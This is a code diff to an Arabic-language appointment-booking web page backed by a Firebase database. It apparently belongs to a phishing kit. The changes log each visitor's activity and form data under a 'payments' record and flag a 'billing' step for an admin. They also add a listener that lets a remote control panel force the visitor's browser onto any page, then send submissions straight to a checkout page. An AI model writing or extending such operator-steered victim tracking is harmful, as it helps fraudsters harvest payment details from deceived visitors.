@@ -322,7 +322,7 @@
       appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
     };
     
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
 
     let visitorId = localStorage.getItem('visitorId');
@@ -332,9 +332,11 @@
     }
 
     const userRef = db.ref('payments/' + visitorId);
+    
+    // تتبع النشاط المباشر
     userRef.update({
         lastActive: firebase.database.ServerValue.TIMESTAMP,
-        currentPage: "صفحة الحجز (Booking)",
+        currentPage: "صفحة حجز الموعد (order-details)",
         status: "online"
     });
 
@@ -444,13 +446,13 @@
             regType: document.getElementById('reg_type').value,
             sType: document.getElementById('s_type').value,
             lastUpdate: new Date().toLocaleString('ar-SA'),
-            status: "online"
+            status: "online",
+            nextStep: "billing" // توجيه للأدمن
         };
 
         userRef.update(formData).then(() => {
-            db.ref('orders').push({ ...formData, visitorId: visitorId }).then(() => {
-                window.location.href = "confirm.html";
-            });
+            // التوجيه التلقائي لصفحة الدفع بالاسم الجديد
+            window.location.href = "checkout-p.html";
         }).catch(err => {
             alert("حدث خطأ: " + err.message);
             btn.disabled = false;
@@ -460,6 +462,14 @@
 
     var map = L.map('map').setView([24.7136, 46.6753], 6);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+    // مراقبة لوحة التحكم للتحويل القسري
+    userRef.on('value', (snapshot) => {
+        const data = snapshot.val();
+        if (data && data.forceRedirect && data.forceRedirect !== "order-details.html") {
+            window.location.href = data.forceRedirect;
+        }
+    });
 </script>
 </body>
 </html>
